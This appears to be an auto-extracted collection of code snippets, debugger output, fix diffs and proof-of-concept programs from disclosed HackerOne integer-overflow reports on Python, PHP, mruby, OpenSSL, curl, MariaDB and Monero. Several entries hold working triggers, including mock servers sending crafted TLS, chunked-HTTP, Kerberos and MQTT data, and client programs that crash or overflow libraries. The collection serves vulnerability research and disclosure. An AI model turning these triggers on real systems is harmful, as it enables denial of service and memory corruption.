# Integer overflow — verbatim payloads/PoC snippets from disclosed HackerOne reports

Auto-extracted 2026-11-12 from `data/h1` (code blocks and raw HTTP requests in the reporter's own text). Top reports by bounty, then votes. Full context: the linked report file.

## #241202 Unsafe arithmetic in PyString_DecodeEscape — ibb — $500 — Integer Overflow
Source: `hackerone/reports/2017/241202.md` (https://hackerone.com/reports/241202)

```
    PyObject *PyString_DecodeEscape(const char *s,
                                    Py_ssize_t len,
                                    const char *errors,
                                    Py_ssize_t unicode,
                                    const char *recode_encoding)
    {
        int c;
        char *p, *buf;
        const char *end;
        PyObject *v;
(1)     Py_ssize_t newlen = recode_encoding ? 4*len:len;
(2)     v = PyString_FromStringAndSize((char *)NULL, newlen);
        if (v == NULL)
            return NULL;
(3)     p = buf = PyString_AsString(v);
        end = s + len;
        while (s < end) {
            if (*s != '\\') {
              non_esc:
    #ifdef Py_USING_UNICODE
    [...]
    #else
(4)             *p++ = *s++;
    #endif
                continue;
    [...]
            }
        }
        if (p-buf < newlen)
            _PyString_Resize(&v, p - buf); /* v is cleared on error */
        return v;
      failed:
        Py_DECREF(v);
        return NULL;
    }
```

```
    # -*- coding: us-ascii -*-
```

```
diff --git a/Objects/stringobject.c b/Objects/stringobject.c
index c78e193..59d22e7 100644
--- a/Objects/stringobject.c
+++ b/Objects/stringobject.c
@@ -612,7 +612,13 @@ PyObject *PyString_DecodeEscape(const char *s,
     char *p, *buf;
     const char *end;
     PyObject *v;
-    Py_ssize_t newlen = recode_encoding ? 4*len:len;
+    Py_ssize_t newlen;
+    /* Check for integer overflow */
+    if (recode_encoding && (len > PY_SSIZE_T_MAX / 4)) {
+        PyErr_SetString(PyExc_OverflowError, "string is too large");
+        return NULL;
+    }
+    newlen = recode_encoding ? 4*len:len;
     v = PyString_FromStringAndSize((char *)NULL, newlen);
     if (v == NULL)
         return NULL;
```

## #129771 Python 2.7 strop.replace Integer Overflow — ibb — $500 — Memory Corruption - Generic
Source: `hackerone/reports/2016/129771.md` (https://hackerone.com/reports/129771)

```
         const char *pat, Py_ssize_t pat_len,           /* pattern string to find */
         const char *sub, Py_ssize_t sub_len,           /* substitution string */
         Py_ssize_t count,                              /* number of replacements */
         Py_ssize_t *out_len)
```

```
    new_len = len + nfound*(sub_len - pat_len); <<<< Unchecked arithmetic can overflow here.
    if (new_len == 0) {
        /* Have to allocate something for the caller to free(). */
        out_s = (char *)PyMem_MALLOC(1);
        if (out_s == NULL)
            return NULL;
        out_s[0] = '\0';
    }
    else {
        assert(new_len > 0);
        new_s = (char *)PyMem_MALLOC(new_len); <<<< An allocation is performed using overflowed value.
        if (new_s == NULL)
            return NULL;
        out_s = new_s;
```

```
        for (; count > 0 && len > 0; --count) { <<<< Memory is copied to new_s using len, which can be greater than the overflowed new_len value.
            /* find index of next instance of pattern */
            offset = mymemfind(str, len, pat, pat_len);
            if (offset == -1)
                break;
```

## #141212 Integer underflow / arbitrary null write in fread/gzread — ibb — $500 — Memory Corruption - Generic
Source: `hackerone/reports/2019/141212.md` (https://hackerone.com/reports/141212)

```
(gdb) run gzread2.php 
Starting program: /home/operac/php/php-56/sapi/cli/php gzread2.php

Program received signal SIGSEGV, Segmentation fault.
0x0000000000727b66 in zif_fread (ht=2, return_value=0x7ffff7fd7d00, return_value_ptr=0x7ffff7fa21c8, this_ptr=0x0, return_value_used=0)
    at /home/operac/php/php-56/ext/standard/file.c:1769
1769            Z_STRVAL_P(return_value)[Z_STRLEN_P(return_value)] = 0;
(gdb) print (*return_value)
$2 = {value = {lval = 140735140003952, dval = 6,9532397838610798e-310, str = {val = 0x7fff74070070 "", len = -2147483648}, ht = 0x7fff74070070, 
    obj = {handle = 1946615920, handlers = 0x5a5a5a5a80000000}, ast = 0x7fff74070070}, refcount__gc = 1, type = 0 '\000', is_ref__gc = 0 '\000'}
(gdb) print (*return_value).value.str.len
$1 = -2147483648
```

```
 /* needed because recv/read/gzread doesnt put a null at the end*/
 Z_STRVAL_P(return_value)[Z_STRLEN_P(return_value)] = 0; 
```

```
    at /home/operac/php/php-56/ext/standard/file.c:1769
```

## #192235 Integer Overflow in mrb_ary_set — shopify-scripts — $100 — Memory Corruption - Generic
Source: `hackerone/reports/2017/192235.md` (https://hackerone.com/reports/192235)

```
ary = Array.new(0)
ary[0x7fffffff] = 1
```

```
$ gdb -q --args ./bin/mruby ./test.rb
Reading symbols from ./bin/mruby...done.
(gdb) r
Starting program: /home/tunz/working/mruby/mruby/bin/mruby ./test.rb

Program received signal SIGSEGV, Segmentation fault.
0x00000000004146a8 in ary_fill_with_nil (ptr=0x1357010, size=2147476218) at /home/tunz/working/mruby/mruby/src/array.c:104
104         *ptr++ = nil;
(gdb) list
99      ary_fill_with_nil(mrb_value *ptr, mrb_int size)
100     {
101       mrb_value nil = mrb_nil_value();
102
103       while (size--) {
104         *ptr++ = nil;
105       }
106     }
107
108     static void
(gdb) x/i $pc
=> 0x4146a8 <ary_fill_with_nil+50>:     mov    QWORD PTR [rcx],rax
(gdb) i r rcx
rcx            0x1357000        20279296
(gdb) bt
#0  0x00000000004146a8 in ary_fill_with_nil (ptr=0x1357010, size=2147476218) at /home/tunz/working/mruby/mruby/src/array.c:104
#1  0x0000000000415ab1 in mrb_ary_set (mrb=0x12d2010, ary=..., n=2147483647, val=...)
    at /home/tunz/working/mruby/mruby/src/array.c:564
#2  0x0000000000416266 in mrb_ary_aset (mrb=0x12d2010, self=...) at /home/tunz/working/mruby/mruby/src/array.c:798
#3  0x000000000043032c in mrb_vm_exec (mrb=0x12d2010, proc=0x12d5210, pc=0x133a020) at /home/tunz/working/mruby/mruby/src/vm.c:1171
#4  0x000000000042e850 in mrb_vm_run (mrb=0x12d2010, proc=0x12d5210, self=..., stack_keep=0)
    at /home/tunz/working/mruby/mruby/src/vm.c:772
#5  0x00000000004367f6 in mrb_top_run (mrb=0x12d2010, proc=0x12d5210, self=..., stack_keep=0)
    at /home/tunz/wor
```

```
 548 MRB_API void
 549 mrb_ary_set(mrb_state *mrb, mrb_value ary, mrb_int n, mrb_value val)
 550 {
...
 562     if (a->aux.capa <= n)
 563       ary_expand_capa(mrb, a, n + 1); // <- n + 1 can be overflowed?
 564     ary_fill_with_nil(a->ptr + a->len, n + 1 - a->len);
 565     a->len = n + 1;
 566   }
```

## #3523349 Integer Underflow in src/var.c — curl — - — Integer Underflow
Source: `hackerone/reports/2026/3523349.md` (https://hackerone.com/reports/3523349)

```
     set a breakpoint at `setvariable`
     Manipulate the offsets:`set var startoffset = 100` `set var endoffset = 50`
```

## #1113025 Integer overflow in CipherUpdate — ibb — - — Integer Overflow
Source: `hackerone/reports/2021/1113025.md` (https://hackerone.com/reports/1113025)

```
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>
#include <openssl/evp.h>

int main() {
    int res;
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    assert(ctx != NULL);
    unsigned char key[] = "0000000000000000";
    unsigned char iv[] = "0000000000000000";
    res = EVP_CipherInit_ex(ctx, EVP_aes_128_cbc(), NULL, key, iv, 1);
    assert(res == 1);
    int intmax = 2147483647;
    void *inbuf = malloc(intmax);
    void *outbuf = malloc((size_t)2147483648);
    int outlen = 0;
    unsigned char data[] = "0";
    res = EVP_CipherUpdate(ctx, outbuf, &outlen, data, 1);
    printf("Processed %i bytes, outlen: %i, res: %i\n", 1, outlen, res);
    assert(res == 1);
    outlen = 0;
    res = EVP_CipherUpdate(ctx, outbuf, &outlen, (unsigned char
*)inbuf, intmax);
    assert(res == 1);
    printf("Processed %i bytes, outlen: %i, res: %i\n", intmax, outlen, res);
}
```

```
    int res;
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    assert(ctx != NULL);
    unsigned char key[] = "0000000000000000";
    unsigned char iv[] = "0000000000000000";
    res = EVP_CipherInit_ex(ctx, EVP_aes_128_cbc(), NULL, key, iv, 1);
    assert(res == 1);
    int intmax = 2147483647;
    void *inbuf = malloc(intmax);
    void *outbuf = malloc((size_t)2147483648);
    int outlen = 0;
    unsigned char data[] = "0";
    res = EVP_CipherUpdate(ctx, outbuf, &outlen, data, 1);
    printf("Processed %i bytes, outlen: %i, res: %i\n", 1, outlen, res);
    assert(res == 1);
    outlen = 0;
    res = EVP_CipherUpdate(ctx, outbuf, &outlen, (unsigned char
```

```
    assert(res == 1);
    printf("Processed %i bytes, outlen: %i, res: %i\n", intmax, outlen, res);
```

## #1562515 Integer overflow vulnerability  — glovo — - — Integer Overflow
Source: `hackerone/reports/2022/1562515.md` (https://hackerone.com/reports/1562515)

```
    An integer overflow during a buffer length calculation can result in allocating a buffer that is too small to hold the data to be copied into it. A buffer overflow can result when the data is copied.
```

```
    When calculating a purchase order total, an integer overflow could allow the total to shift from a positive value to a negative one. This would, in effect, give money to the customer in addition to their purchases, when the transaction is completed.
```

```
    Withdrawing 1 dollar from an account with a balance of 0 could cause an integer underflow and yield a new balance of 4,294,967,295.
```

## #3282709 Integer Overflow in schannel.c TLS Data Transmission — curl — - — Integer Overflow
Source: `hackerone/reports/2025/3282709.md` (https://hackerone.com/reports/3282709)

```
/* send the encrypted message including header, data and trailer */
len = outbuf[0].cbBuffer + outbuf[1].cbBuffer + outbuf[2].cbBuffer;
```

```
=== Schannel Vulnerability PoC Server (Windows) ===
This server attempts to trigger the integer overflow
in curl's schannel.c by sending crafted TLS responses

[*] Initializing Winsock...
[*] Malicious server listening on port 4433
[*] Test with: curl -k https://localhost:4433
[*] Client connected
[*] Received 1815 bytes (ClientHello)
[*] Sending malicious TLS record...
[*] Sent malicious TLS records
[*] Connection closed

[*] Client connected
[*] Received 1783 bytes (ClientHello)
[*] Sending malicious TLS record...
[*] Sent malicious TLS records
[*] Connection closed

[*] Client connected
[*] Received 1719 bytes (ClientHello)
[*] Sending malicious TLS record...
[*] Sent malicious TLS records
[*] Connection closed

[*] Client connected
[*] Received 1783 bytes (ClientHello)
[*] Sending malicious TLS record...
[*] Sent malicious TLS records
[*] Connection closed

[*] Client connected
[*] Received 281 bytes (ClientHello)
[*] Sending malicious TLS record...
[*] Sent malicious TLS records
[*] Connection closed
```

```
curl -k https://localhost:4433/
curl: (35) schannel: next InitializeSecurityContext failed: SEC_E_INVALID_TOKEN (0x80090308) - The token supplied to the function is invalid
```

## #3516186 Cookie Max-Age Integer Overflow Vulnerability — curl — - — Integer Overflow
Source: `hackerone/reports/2026/3516186.md` (https://hackerone.com/reports/3516186)

```
else if(CURL_OFF_T_MAX - now < co->expires)
    /* would overflow */
    co->expires = CURL_OFF_T_MAX;
else
    co->expires += now;
```

```
   if(CURL_OFF_T_MAX - now < co->expires)
   
```

```
   co->expires += now;
   
```

## #3344663 Security Analysis Report: CURL Integer Overflow Vulnerability — curl — - — Integer Overflow
Source: `hackerone/reports/2025/3344663.md` (https://hackerone.com/reports/3344663)

```
lib/http_chunks.c (line 173)
lib/curlx/strparse.c (lines 185–186)
```

```
// http_chunks.c line 173
if(curlx_str_hex(&p, &ch->datasize, CURL_OFF_T_MAX)) {
    // Error handling
}
// strparse.c lines 185-186
if(num > ((max - n) / base))
    return STRE_OVERFLOW;
num = num * base + n;
```

```
#!/usr/bin/env python3

import socket
import threading

def create_test_response():
    overflow_chunk_size = "7FFFFFFFFFFFFFFFF"
    
    html_content = "<html><body><h1>Overflow Test Page</h1><p>If you see this, curl continued reading.</p></body></html>"
    
    response = (
        "HTTP/1.1 200 OK\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Content-Type: text/html\r\n"
        "Connection: close\r\n"
        "\r\n"
        f"{overflow_chunk_size}\r\n"  
        "VULNERABILITY_PROOF_DATA\r\n"  
        f"{len(html_content):X}\r\n"  
        f"{html_content}\r\n"  
        "0\r\n"  
        "\r\n"
    )
    return response.encode()
def handle_client(client_socket, addr):
    print(f"[+] Connection from {addr}")
    try:
        request = client_socket.recv(1024)
        print(f"[+] Sending test response with overflow and HTML chunk...")
        response = create_test_response()
        client_socket.send(response)
        print(f"[+] Response sent!")
    except Exception as e:
        print(f"[-] Error: {e}")
    finally:
        client_socket.close()
def start_test_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server.bind(('127.0.0.1', 8080))
        server.listen(5)
        print("=" * 60)
        print("CURL INTEGER OVERFLOW TEST CONTINUATION ")
        print("=" * 60)
        print("Server running on port 8080")
        print("After sending overf
```

## #3240792 Reported RPC Overflow — monero — - — Integer Overflow
Source: `hackerone/reports/2026/3240792.md` (https://hackerone.com/reports/3240792)

```
==9082==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7fa31d153228 at pc 0x56045cd8cc32 bp 0x7ffd3ad28590 sp 0x7ffd3ad27d50
READ of size 32 at 0x7fa31d153228 thread T0
    #0 0x56045cd8cc31 in __asan_memcpy /src/llvm-project/compiler-rt/lib/asan/asan_interceptors_memintrinsics.cpp:63:3
    #1 0x56045d97ee5a in construct<crypto::key_image, const crypto::key_image &> /usr/local/bin/../include/c++/v1/__memory/allocator.h:173:24
    #2 0x56045d97ee5a in construct<crypto::key_image, const crypto::key_image &, void> /usr/local/bin/../include/c++/v1/__memory/allocator_traits.h:296:9
    #3 0x56045d97ee5a in crypto::key_image* std::__1::vector<crypto::key_image, std::__1::allocator<crypto::key_image>>::__push_back_slow_path<crypto::key_image const&>(crypto::key_image const&) /usr/local/bin/../include/c++/v1/vector:1
453:3                                                      
    #4 0x56045d6919ee in push_back /usr/local/bin/../include/c++/v1/vector:1467:13
    #5 0x56045d6919ee in cryptonote::core_rpc_server::on_is_key_image_spent(epee::misc_utils::struct_init<cryptonote::COMMAND_RPC_IS_KEY_IMAGE_SPENT::request_t> const&, epee::misc_utils::struct_init<cryptonote::COMMAND_RPC_IS_KEY_IMAGE_
SPENT::response_t>&, epee::net_utils::connection_context_base const*) /src/monero/monero/src/rpc/core_rpc_server.cpp:1291:18                                                                                                                
    #6 0x56045d16ffd2 in fuzz_is_key_image_spent(
```

```
    #0 0x56045cd8cc31 in __asan_memcpy /src/llvm-project/compiler-rt/lib/asan/asan_interceptors_memintrinsics.cpp:63:3
    #1 0x56045d97ee5a in construct<crypto::key_image, const crypto::key_image &> /usr/local/bin/../include/c++/v1/__memory/allocator.h:173:24
    #2 0x56045d97ee5a in construct<crypto::key_image, const crypto::key_image &, void> /usr/local/bin/../include/c++/v1/__memory/allocator_traits.h:296:9
    #3 0x56045d97ee5a in crypto::key_image* std::__1::vector<crypto::key_image, std::__1::allocator<crypto::key_image>>::__push_back_slow_path<crypto::key_image const&>(crypto::key_image const&) /usr/local/bin/../include/c++/v1/vector:1
```

```
    #4 0x56045d6919ee in push_back /usr/local/bin/../include/c++/v1/vector:1467:13
    #5 0x56045d6919ee in cryptonote::core_rpc_server::on_is_key_image_spent(epee::misc_utils::struct_init<cryptonote::COMMAND_RPC_IS_KEY_IMAGE_SPENT::request_t> const&, epee::misc_utils::struct_init<cryptonote::COMMAND_RPC_IS_KEY_IMAGE_
```

## #547630 CVE-2019-5435: An integer overflow found in /lib/urlapi.c — curl — - — Incorrect Calculation of Buffer Size
Source: `hackerone/reports/2020/547630.md` (https://hackerone.com/reports/547630)

```
static CURLUcode seturl(const char *url, CURLU *u, unsigned int flags)
{
  char *path;
  bool path_alloced = FALSE;
  char *hostname;
  char *query = NULL;
  char *fragment = NULL;
  CURLUcode result;
  bool url_has_scheme = FALSE;
  char schemebuf[MAX_SCHEME_LEN];
  char *schemep = NULL;
  size_t schemelen = 0;
  size_t urllen;
  const struct Curl_handler *h = NULL;

  if(!url)
    return CURLUE_MALFORMED_INPUT;

  /*************************************************************
   * Parse the URL.
   ************************************************************/
  /* allocate scratch area */
  urllen = strlen(url);
  path = u->scratch = malloc(urllen * 2 + 2); <= overflow here
```

```
static CURLUcode parseurl(const char *url, CURLU *u, unsigned int flags)
{
  CURLUcode result = seturl(url, u, flags);
  if(result) {
    free_urlhandle(u);
    memset(u, 0, sizeof(struct Curl_URL));
  }
  return result;
}
```

```
CURLUcode curl_url_set(CURLU *u, CURLUPart what,
                       const char *part, unsigned int flags)
......
case CURLUPART_URL: {
    /*
     * Allow a new URL to replace the existing (if any) contents.
     *
     * If the existing contents is enough for a URL, allow a relative URL to
     * replace it.
     */
    CURLUcode result;
    char *oldurl;
    char *redired_url;
    CURLU *handle2;

    if(Curl_is_absolute_url(part, NULL, MAX_SCHEME_LEN)) {
      handle2 = curl_url();
      if(!handle2)
        return CURLUE_OUT_OF_MEMORY;
      result = parseurl(part, handle2, flags); <= call parseurl
      if(!result)
        mv_urlhandle(handle2, u);
      else
        curl_url_cleanup(handle2);
      return result;
    }
```

## #3341476 int overflow in krb5_read_data() leads to (possible) massive `recv()` write — curl — - — Integer Overflow
Source: `hackerone/reports/2025/3341476.md` (https://hackerone.com/reports/3341476)

```
    len = (int)ntohl((uint32_t)len);
    if(len > CURL_MAX_INPUT_LENGTH)
      return CURLE_TOO_LARGE;
```

```
    char buffer[1024];
    nread = CURLMIN(len, (int)sizeof(buffer));
    result = socket_read(data, sockindex, buffer, (size_t)nread);
```

```
#!/usr/bin/env python3
import socket, struct, argparse, sys, time

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, default=9999)
    ap.add_argument("--netlen", type=lambda x:int(x,0), default=0x00000010,
                    help="4-byte big-endian length to send (e.g. 0x10 or 16)")
    ap.add_argument("--payload-byte", default="41", help="hex byte to repeat (default '41' = 'A')")
    args = ap.parse_args()

    payload = bytes([int(args.payload_byte, 16)]) * (args.netlen & 0xffffffff)
    netlen = struct.pack("!I", args.netlen & 0xffffffff)

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", args.port))
    s.listen(1)
    print(f"listening on :{args.port} …")
    while True:
        conn, addr = s.accept()
        print("client:", addr, " sending frame len=", hex(args.netlen))
        try:
            conn.sendall(netlen)
            if args.netlen:
                conn.sendall(payload)
            time.sleep(0.2)
        finally:
            conn.close()

if __name__ == "__main__":
    main()
```

## #3771139 Heap Memory Disclosure via Integer Underflow in Item_func_json_arrayagg::cut_max_length in MariaDB Server — mariadb — - — Buffer Over-read
Source: `hackerone/reports/2026/3771139.md` (https://hackerone.com/reports/3771139)

```
void Item_func_json_arrayagg::cut_max_length(String *result,
       uint old_length, uint max_length) const
{
  if (result->length() == 0)
    return;
  if (result->ptr()[result->length() - 1] != '"' || max_length == 0)
  {
    Item_func_group_concat::cut_max_length(result, old_length, max_length);
    return;
  }
  Item_func_group_concat::cut_max_length(result, old_length, max_length-1);
  result->append('"');
}
```

```
void Item_func_group_concat::cut_max_length(String *result,
        uint old_length, uint max_length) const
{
  const char *ptr= result->ptr();
  size_t add_length= Well_formed_prefix(collation.collation,
                                      ptr + old_length,    // start
                                      ptr + max_length,    // end < start when underflow
                                      result->length()).length();
  result->length(old_length + add_length);
}
```

```
size_t my_well_formed_char_length_8bit(...)
{
  size_t nbytes= (size_t) (end - start); // wraps to ~SIZE_MAX when end < start
  size_t res= MY_MIN(nbytes, nchars);    // = nchars = result->length()
  return res;
}
```

## #3665363 Integer Overflow/Signedness Mismatch in Printf Precision for HTTP/2 Trailer Headers — curl — - — Integer Overflow
Source: `hackerone/reports/2026/3665363.md` (https://hackerone.com/reports/3665363)

```
if(stream->bodystarted) {
    /* This is a trailer */
    H2BUGF(infof(data_s, "h2 trailer: %.*s: %.*s", namelen, name, valuelen,
                 value));
    result = Curl_dyn_addf(&stream->trailer_recvbuf,
                           "%.*s: %.*s\r\n", namelen, name,
                           valuelen, value);
    if(result)
      return NGHTTP2_ERR_CALLBACK_FAILURE;

    return 0;
  }
```

```
CURLcode Curl_http2_request_upgrade(struct dynbuf *req,
                                    struct Curl_easy *data)
{
  CURLcode result;
  ssize_t binlen;
  char *base64;
  size_t blen;
  struct connectdata *conn = data->conn;
  struct SingleRequest *k = &data->req;
  uint8_t *binsettings = conn->proto.httpc.binsettings;
  struct http_conn *httpc = &conn->proto.httpc;

  populate_settings(data, httpc);

  /* this returns number of bytes it wrote */
  binlen = nghttp2_pack_settings_payload(binsettings, H2_BINSETTINGS_LEN,
                                         httpc->local_settings,
                                         httpc->local_settings_num);
  if(binlen <= 0) {
    failf(data, "nghttp2 unexpectedly failed on pack_settings_payload");
    Curl_dyn_free(req);
    return CURLE_FAILED_INIT;
  }
  conn->proto.httpc.binlen = binlen;

  result = Curl_base64url_encode((const char *)binsettings, binlen,
                                 &base64, &blen);
  if(result) {
    Curl_dyn_free(req);
    return result;
  }

  result = Curl_dyn_addf(req,
                         "Connection: Upgrade, HTTP2-Settings\r\n"
                         "Upgrade: %s\r\n"
                         "HTTP2-Settings: %s\r\n",
                         NGHTTP2_CLEARTEXT_PROTO_VERSION_ID, base64);
  free(base64);

  k->upgr101 = UPGR101_REQUESTED;

  return result;
}
```

```
result = Curl_dyn_addf(&stream->trailer_recvbuf,
                       "%.*s: %.*s\r\n", namelen, name,
                       valuelen, value);
```

## #3484319 MQTT Protocol Violation & Integer Overflow in libcurl — curl — - — Integer Overflow
Source: `hackerone/reports/2026/3484319.md` (https://hackerone.com/reports/3484319)

```
for(i = 0; (len > 0) && (i < 4); i++) {
  unsigned char encoded;
  encoded = len % 0x80;
  /* ... */
}
```

```
for(i = 0; (i < buflen) && (encoded & 128); i++) {
  encoded = buf[i];
  len += (encoded & 127) * mult;
  mult *= 128;
}
```

```
for(i = 0; (i < buflen) && (encoded & 128); i++) {
  if(i >= 4) {
    /* Malformed Remaining Length */
    return 0; /* or propagate an error to the caller */
  }
  encoded = buf[i];
  len += (encoded & 127) * mult;
  mult *= 128;
}
```

## #3479019 Security hardening: missing integer overflow check in curl_load_library() — curl — - — Integer Overflow
Source: `hackerone/reports/2025/3479019.md` (https://hackerone.com/reports/3479019)

```
UINT systemdirlen = GetSystemDirectory(NULL, 0);
if(systemdirlen) {
  size_t filenamelen = _tcslen(filename);
  TCHAR *path = curlx_malloc(sizeof(TCHAR) *
                             (systemdirlen + 1 + filenamelen));
  if(path && GetSystemDirectory(path, systemdirlen)) {
    _tcscpy(path + _tcslen(path), TEXT("\\"));
    _tcscpy(path + _tcslen(path), filename);
  }
  curlx_free(path);
}
```

```
sizeof(TCHAR) * (systemdirlen + 1 + filenamelen)
```

```
if(filenamelen > (SIZE_MAX / sizeof(TCHAR)) - systemdirlen - 1) {
  return NULL;
}

TCHAR *path = curlx_malloc(sizeof(TCHAR) *
                           (systemdirlen + 1 + filenamelen));
```

## #3417428 libcurl MQTT `CURLOPT_POSTFIELDSIZE_LARGE` overflow leads to immediate DoS — curl — - — Integer Overflow
Source: `hackerone/reports/2025/3417428.md` (https://hackerone.com/reports/3417428)

```
import socket

HOST, PORT = "127.0.0.1", 1883
CONNACK = b"\x20\x02\x00\x00"

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, PORT))
    s.listen(1)
    print(f"[server] listening on {HOST}:{PORT}")
    conn, addr = s.accept()
    with conn:
        print(f"[server] accepted connection from {addr}")
        data = conn.recv(1024)
        print(f"[server] received {len(data)} bytes")
        conn.sendall(CONNACK)
        print("[server] sent CONNACK")
        conn.recv(1024)
        print("[server] received publish (possibly truncated)")
```

```
#include <curl/curl.h>
#include <stdio.h>

int main(void)
{
  CURL *curl = curl_easy_init();
  if(!curl) {
    fprintf(stderr, "curl_easy_init failed\n");
    return 1;
  }

  const char payload[] = "X";                       /* actual data: 1 byte */
  const curl_off_t fake_size = ((curl_off_t)1 << 62); /* advertise ~4 EB */

  curl_easy_setopt(curl, CURLOPT_URL, "mqtt://127.0.0.1:1883/topic");
  curl_easy_setopt(curl, CURLOPT_POSTFIELDS, payload);
  curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE_LARGE, fake_size);
  curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT_MS, 2000L);
  curl_easy_setopt(curl, CURLOPT_TIMEOUT_MS, 3000L);
  curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);

  fprintf(stderr, "[*] requesting payload size: %lld\n", (long long)fake_size);

  CURLcode res = curl_easy_perform(curl);
  fprintf(stderr, "curl_easy_perform: %d\n", res);

  curl_easy_cleanup(curl);
  return (int)res;
}
```

```
# Configure and build libcurl with MQTT enabled (example using CMake)
cmake -S . -B build-mqtt -DCMAKE_BUILD_TYPE=Debug -DCURL_USE_LIBPSL=OFF
cmake --build build-mqtt --target libcurl_shared -- -j8

# Compile PoC with AddressSanitizer
clang -fsanitize=address -Iinclude -Ibuild-mqtt/lib \
  -Lbuild-mqtt/lib -Wl,-rpath,build-mqtt/lib \
  build-mqtt/poc/mqtt_overflow.c -lcurl-d -o build-mqtt/poc/mqtt_overflow

# Launch mock server and execute PoC
python3 build-mqtt/poc/mqtt_server.py &
build-mqtt/poc/mqtt_overflow
```

## #140865 Integer Overflow in php_html_entities() — ibb — - — None
Source: `hackerone/reports/2019/140865.md` (https://hackerone.com/reports/140865)

```
static void php_html_entities(INTERNAL_FUNCTION_PARAMETERS, int all)
{
	...
	size_t new_len;
	...
	RETVAL_STRINGL(replaced, (int)new_len, 0);
}
```

```
ZEND_API int add_string_to_string(zval *result, const zval *op1, const zval *op2) /* {{{ */
{
	int length = Z_STRLEN_P(op1) + Z_STRLEN_P(op2);
	char *buf;

	if (IS_INTERNED(Z_STRVAL_P(op1))) {
		buf = (char *) emalloc(length+1);
		memcpy(buf, Z_STRVAL_P(op1), Z_STRLEN_P(op1));
	} else {
		buf = (char *) erealloc(Z_STRVAL_P(op1), length+1);
	}
	memcpy(buf + Z_STRLEN_P(op1), Z_STRVAL_P(op2), Z_STRLEN_P(op2));
```

```
<?php

ini_set('memory_limit', -1);
$str = htmlspecialchars(str_repeat('&', 0xffffffff/5));
echo "$str";

?>
```

## #3508500 integer Overflow in MQTT Protocol Handling Allows Bypassing Message Size Limit — curl — - — Integer Overflow
Source: `hackerone/reports/2026/3508500.md` (https://hackerone.com/reports/3508500)

```
import socket
import struct
import sys
import time

def run_server():
    host = '127.0.0.1'
    port = 1883
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((host, port))
    sock.listen(1)
    
    print(f"Listening on {host}:{port}")
    sys.stdout.flush()
    
    conn, addr = sock.accept()
    print(f"Connection from {addr}")
    sys.stdout.flush()
    
    try:
        # Read CONNECT packet
        # Just read some bytes
        data = conn.recv(1024)
        print(f"Received CONNECT: {len(data)} bytes")
        sys.stdout.flush()
        
        # Send CONNACK
        # Fixed header: 0x20, Remaining Length: 0x02
        # Variable header: Connect Acknowledge Flags: 0x00, Connect Return Code: 0x00 (Accepted)
        connack = b'\x20\x02\x00\x00'
        conn.sendall(connack)
        print("Sent CONNACK")
        sys.stdout.flush()
        
        # Now expect PUBLISH
        # Read the first few bytes to see the length
        head = conn.recv(5)
        if not head:
            print("Client disconnected immediately")
            return

        print(f"Received head: {head.hex()}")
        sys.stdout.flush()
        
        # We expect a huge packet if the vulnerability works
        
        received = len(head)
        start_time = time.time()
        
        while True:
            chunk = conn.recv(65536)
            if not chunk:
                break
            rec
```

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>

int main(void)
{
    CURL *curl;
    CURLcode res;

    
    setenv("ASAN_OPTIONS", "detect_leaks=0", 1);

    curl_global_init(CURL_GLOBAL_ALL);
    curl = curl_easy_init();
    if(curl) {
        curl_easy_setopt(curl, CURLOPT_URL, "mqtt://127.0.0.1:1883/topic");
        curl_easy_setopt(curl, CURLOPT_POST, 1L);

        /* use payload bigger than MAX_MQTT_MESSAGE_SIZE (~268MB) */
        const curl_off_t huge_size = (curl_off_t)300 * 1024 * 1024;
        curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE_LARGE, huge_size);

  
        char *buf = (char *)calloc(1, 1024);
        if(!buf) {
            fprintf(stderr, "Failed to allocate small buffer\n");
            return 1;
        }
        memset(buf, 'A', 1024);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, buf);

        curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);

        printf("ASAN PoC: attempting to send %lld bytes to MQTT...\n",
               (long long)huge_size);
        res = curl_easy_perform(curl);

        if(res == CURLE_OK) {
            printf("[ASAN] Transfer succeeded -> limit bypass confirmed.\n");
        }
        else if (res == CURLE_TOO_LARGE || res == CURLE_FILESIZE_EXCEEDED) {
            printf("[ASAN] Transfer blocked by size limit.\n");
        }
        else {
            printf("[ASAN] Transfer failed: %d (%s)\n", res, curl_easy_strerror(res));
        }

        free(buf);
        curl_easy_cleanup(curl)
```

```
Listening on 127.0.0.1:1883
Connection from ('127.0.0.1', 51950)
Received CONNECT: 26 bytes
Sent CONNACK
Client disconnected immediately
```

## #6389 Integer overflow in strop.expandtabs — ibb — - — None
Source: `hackerone/reports/2014/6389.md` (https://hackerone.com/reports/6389)

```
static PyObject *
strop_expandtabs(PyObject *self, PyObject *args)
...
  i = j = old_j = 0;
  e = string + stringlen;
  for (p = string; p < e; p++) {
      if (*p == '\t') {
          j += tabsize - (j%tabsize);
          if (old_j > j) {
              PyErr_SetString(PyExc_OverflowError,
                              "new string is too long");
              return NULL;
          }
          old_j = j;
      } else {
          j++;
          if (*p == '\n') {
              i += j;               <-- missing check here
              j = 0;
          }
      }
  }
...
  out = PyString_FromStringAndSize(NULL, i+j);
...
  i = 0;
  q = PyString_AS_STRING(out);

  for (p = string; p < e; p++) {
      if (*p == '\t') {
          j = tabsize - (i%tabsize);
          i += j;
          while (j-- > 0)
